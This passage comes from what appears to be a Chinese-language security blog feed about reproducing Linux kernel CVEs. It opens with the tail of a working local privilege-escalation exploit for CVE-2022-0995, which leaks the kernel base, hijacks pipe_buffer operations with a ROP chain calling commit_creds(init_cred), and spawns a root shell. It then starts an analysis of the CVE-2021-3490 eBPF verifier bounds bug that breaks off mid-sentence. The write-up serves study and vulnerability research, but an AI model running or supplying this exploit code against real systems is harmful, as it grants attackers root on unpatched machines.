=</span> (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_addr, kernel_offset, kernel_base;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = (kernel_addr - <span class="number">0xffffffff8203fe40</span>);</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810938f0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff82c6d580</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_cred = <span class="number">0xffffffff810d25c0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00ff0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> push_rsi_pop_rsp_pop_4reg_ret = <span class="number">0xffffffff812dbede</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span> =</span> (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_pop_4reg_ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain;</span><br><span class="line"></span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_cred;</span><br><span class="line">    rop_chain[rop++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = get_shell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230821100144612.png"                      alt="image-20230821100144612"                ></p><h3 id="pipe-bufferï¼Ÿ"><a href="#pipe-bufferï¼Ÿ" class="headerlink" title="pipe_bufferï¼Ÿ"></a>pipe_bufferï¼Ÿ</h3><p>è¿™é‡Œä¸»è¦è¯´çš„æ˜¯ <a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >å‘pipe_bufferè¯´yes!<i class="fas fa-external-link-alt"></i></a> è¿™ç¯‡æ–‡ç« ä¸­çš„åˆ©ç”¨æ‰‹æ³•ã€‚</p><p>ä¸å¤ªæ¨èï¼Œä¸è¿‡éœ€è¦ä¿®æ”¹ä¸€ä¸‹typeçš„å€¼ä¸º<code>0x306</code>ï¼Œå¦‚æœç»§ç»­ä¿æŒ<code>0x30a</code>çš„è¯ç»“æœæ˜¯åç§»<code>0x400</code>è¿™æ ·å¯¹äº<code>pipe_buffer</code>æ¥è¯´è¿‡äºå¤§äº†ï¼Œå®¹æ˜“é£å‡ºå»ï¼Œæ‰€ä»¥ä¿®æ”¹åˆ°<code>0x40</code>æ•ˆæœæ›´ä½³ã€‚(ä¸è¿‡æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ¯æ¬¡ç”³è¯·çš„æ—¶å€™ä»–éƒ½ç»™æˆ‘ç»“å°¾ä¸º<code>0x40</code>å’Œ<code>0xc0</code>çš„ï¼Œå¥½åƒå°±æ˜¯æ•…æ„çš„ğŸ¤®)</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230821104028747.png"                      alt="image-20230821104028747"                ></p><p>è™½ç„¶æˆ‘ä»¬å¯ä»¥è¾¾åˆ°ä¸Šå›¾ï¼Œä½†æ˜¯åœ¨åç»­çš„åˆ©ç”¨ä¸­ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œé¦–å…ˆå°±æ˜¯<code>pipe</code>å¯¹äºç”³è¯·æ•°é‡çš„é™åˆ¶ï¼Œè¶…è¿‡510ä¸ªæ—¶å°±å‡ºç°äº†æŠ¥é”™ï¼Œè¿™æ ·ä¼šä½¿æˆåŠŸç‡å¤§æ‰“æŠ˜æ‰£ã€‚å…¶æ¬¡å°±æ˜¯è¿™é‡Œæ˜¯é¡µçº§çš„UAFï¼Œæ­£å¦‚å‰é¢çš„æ‰€è¯´ï¼Œç”³è¯·çš„æ•°é‡è¾ƒå°‘é‚£ä¹ˆæˆ‘ä»¬åœ¨åç»­å¯¹<code>pipe</code>ä¿®æ”¹<code>size</code>åˆ†é…å †å—çš„æ—¶å€™ä»åˆšåˆšé‡Šæ”¾çš„é¡µé¢å†…åˆ†é…çš„æ¦‚ç‡åˆè¿›ä¸€æ­¥å‡å°äº†ã€‚å½“ç„¶ï¼Œé¢å¯¹ç¬¬äºŒä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥äº‹å…ˆåˆ†é…å¾ˆå¤š<code>object</code>ç”¨äºæ¶ˆè€—å†…å­˜ä¸­çš„<code>slab</code>ã€‚ä½†æ˜¯ç¬¬ä¸€ä¸ªé—®é¢˜å´æ˜¯ç¡¬ä¼¤æ— æ³•è§£å†³ï¼Œæ‰€ä»¥å°±æˆ‘çœ‹æ¥å¦‚æœé‡åˆ°é¡µçº§çš„<code>off by one/null</code>è¿™æ ·çš„æ¼æ´éœ€è¦äº‹å…ˆé…ç½®å¥½å †é£æ°´çš„æƒ…å†µä»¥å¤–éƒ½ä¸æ˜¯ç‰¹åˆ«æ¨èä½¿ç”¨è¿™ä¸€æ–¹æ³•ã€‚</p><hr><p>å‚è€ƒé“¾æ¥:</p><p>â€‹    <a class="link"   href="https://arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/" >https://arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v5.17-rc3/source" >https://elixir.bootlin.com/linux/v5.17-rc3/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å…¶å®å‰ä¸¤å¤©å¤ç°äº†ä¸€ä¸ª2023çš„CVEï¼Œæœ¬æ¥æ‰“ç®—å†™é‚£ä¸€ä¸ªçš„ï¼Œä½†æ˜¯å¯¹äºé‚£ä¸ªCVEæ›´å¤šçš„æ˜¯åšå·¥ä½œä¸Šçš„é€‚é…ï¼Œåœ¨ä¸€äº›å°ç»†èŠ‚ä¸Šçš„åŸç†å¹¶æ²¡æœ‰æŒæ¡å¾—ç‰¹åˆ«é€å½»</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVEå¤ç°" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="msg_msg" scheme="https://196082.github.io/tags/msg-msg/"/>
    
    <category term="watch queue" scheme="https://196082.github.io/tags/watch-queue/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3490å¤ç°</title>
    <link href="https://196082.github.io/2023/08/12/CVE-2021-3490/"/>
    <id>https://196082.github.io/2023/08/12/CVE-2021-3490/</id>
    <published>2023-08-12T13:30:19.000Z</published>
    <updated>2023-11-29T10:11:13.843Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘ä¸ºäº†æ‰¾å·¥ä½œç–¯ç‹‚å¤ç°CVEæ˜¯çœŸçš„å¤ªéš¾äº†ğŸ˜­ï¼Œä»Šå¤©æ‰å‘ç°æˆ‘å·¥ä½æ—è¾¹çš„å±…ç„¶æ˜¯fmyyçˆ·ğŸ˜­ï¼Œå±äºæ˜¯ç»™è·ªäº†ã€‚</p><p>è¿™æ¬¡å¤ç°çš„è¿™ä¸ªCVEæ˜¯ä¸€ä¸ªå…³äºebpfçš„æ¼æ´ï¼Œå¦‚æœå„ä½æ²¡æœ‰ç›¸å…³çš„åŸºç¡€å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« <a class="link"   href="https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/" >CVE-2017-16995<i class="fas fa-external-link-alt"></i></a>ï¼Œå¹¶ä¸”è¿™æ¬¡è¿™ä¸ªCVEçš„åˆ©ç”¨æ–¹æ³•å’Œä»¥å‰åšçš„ä¸€é“é¢˜å¯ä»¥è¯´æ˜¯ä¸€æ‘¸ä¸€æ ·ï¼Œæ‰€ä»¥è¿™æ¬¡ä¸ä¼šè¯¦ç»†çš„ä»‹ç»åˆ©ç”¨æ–¹æ³•è€Œæ˜¯æ›´å€¾å‘äºè§£é‡Šå¦‚ä½•æ„é€ ä¹‹ç±»çš„ï¼Œå…·ä½“çš„åˆ©ç”¨æ–¹æ³•å¯ä»¥å»çœ‹<a class="link"   href="https://cv196082.gitee.io/2023/01/06/d3bpf/" >d3bpf<i class="fas fa-external-link-alt"></i></a>ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æœ‰è¿‡ebpfçš„åŸºç¡€éƒ½çŸ¥é“åœ¨è½½å…¥ä¸€ä¸ªebpfç¨‹åºçš„æ—¶å€™ä¼šå¯¹æ¯æ¡æŒ‡ä»¤è¿›è¡Œæ£€æŸ¥ï¼Œè€Œæ£€æŸ¥çš„å‡½æ•°å°±åœ¨<code>do_check</code>ä¸­ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªALUè¿ç®—çš„è¯åˆ™ä¼šè¿›å…¥<code>check_alu_op</code>è¿›è¡Œè¿›ä¸€æ­¥æ£€æŸ¥ï¼Œå¦‚æœæˆ‘ä»¬çš„è¿ç®—æ–¹å¼æ˜¯<code>and/or/xor</code>ä¸€ç±»çš„åˆ™ä¼šè¿›å…¥<code>adjust_reg_min_max_vals</code>å‡½æ•°è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€æŸ¥ï¼Œåœ¨å‡½æ•°ä¸­æœ€åä¼šè°ƒç”¨åˆ°<code> adjust_scalar_min_max_vals</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> BPF_ADD:</span><br><span class="line">scalar32_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">dst_reg-&gt;var_off = tnum_add(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_SUB:</span><br><span class="line">scalar32_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">dst_reg-&gt;var_off = tnum_sub(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MUL:</span><br><span class="line">dst_reg-&gt;var_off = tnum_mul(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_mul(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_mul(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_AND:</span><br><span class="line">dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_and(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_and(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_OR:</span><br><span class="line">dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_XOR:</span><br><span class="line">dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­ä¼šæ ¹æ®<code>opcode</code>çš„ä¸åŒè€Œè¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼Œä»¥andä¸ºä¾‹ï¼Œå…¶ä¼šè°ƒç”¨<code>scalar32_min_max_and</code>å’Œ<code>scalar_min_max_and</code>è®¡ç®—32ä½ä»¥åŠ64ä½çš„è¾¹ç•Œå€¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">  <span class="keyword">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);</span><br><span class="line">  s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">  u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Assuming scalar64_min_max_and will be called so its safe</span></span><br><span class="line"><span class="comment"> * to skip updating register for known 32-bit case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">if</span> (src_known &amp;&amp; dst_known)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  dst_reg-&gt;u32_min_value = var32_off.value;</span><br><span class="line">  dst_reg-&gt;u32_max_value = min(dst_reg-&gt;u32_max_value, umax_val);</span><br><span class="line">  <span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">    dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;</span><br><span class="line">    dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ<code>tnum_subreg_is_const</code>å‡½æ•°å¾—åˆ°çš„æ˜¯å½“å‰å¯„å­˜å™¨çš„ä½32ä½å€¼æ˜¯å¦æ˜¯<code>known</code>çš„ï¼Œæ ¹æ®å‡½æ•°çš„æµç¨‹å¦‚æœä¸¤ä¸ªå¯„å­˜å™¨çš„ä½32ä½éƒ½ä¸º<code>known</code>åˆ™ç›´æ¥returnã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€è§‚å¯Ÿè¿™ä¸ªå‡½æ•°ï¼Œé¦–å…ˆåˆ™æ˜¯åˆ¤æ–­äº†64ä½æ˜¯å¦ä¸º<code>known</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸¤ä¸ªå¯„å­˜å™¨éƒ½æ˜¯<code>known</code>çš„çŠ¶æ€çš„è¯ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä¼šå°†<code>imm</code>èµ‹å€¼ç»™å¯„å­˜å™¨å†…çš„å¤šä¸ªæˆå‘˜ã€‚å¦‚æœæ˜¯è¿™æ ·è¿è¡Œçš„è¯ï¼Œé‚£ä¹ˆæ˜¯æ­£å¸¸çš„è¿è¡Œçš„ã€‚ä¸è¿‡å¯ä»¥çœ‹åˆ°çš„æ˜¯è¿™ä¸ª<code>scalar32_min_max_and</code>å‡½æ•°ä¸­å–<code>known</code>çš„å‡½æ•°ä½¿ç”¨çš„æ˜¯<code>tnum_subreg_is_const</code>ï¼Œç„¶è€Œè¿™ä¸ªå‡½æ•°åªä¼šéªŒè¯ä½32ä½çš„<code>mask</code>å€¼ï¼Œå¦‚æœæ­¤æ—¶å­˜åœ¨ä»¥ä¸‹ä¸¤ä¸ªå¯„å­˜å™¨ä¼šæ˜¯è¿™æ ·çš„æ•ˆæœã€‚<code>R1=&#123;.value=0x1, .mask=0xffffffff00000000&#125;</code>ï¼Œ<code>R2=&#123;.value=0x100000002, .mask=0x0&#125;</code>å¦‚æœä¸¤ä¸ªå¯„å­˜å™¨è¿›è¡Œandè¿ç®—çš„è¯ï¼Œé‚£ä¹ˆç»“æœå°±ä¸º<code>R1=&#123;.value=0x0, 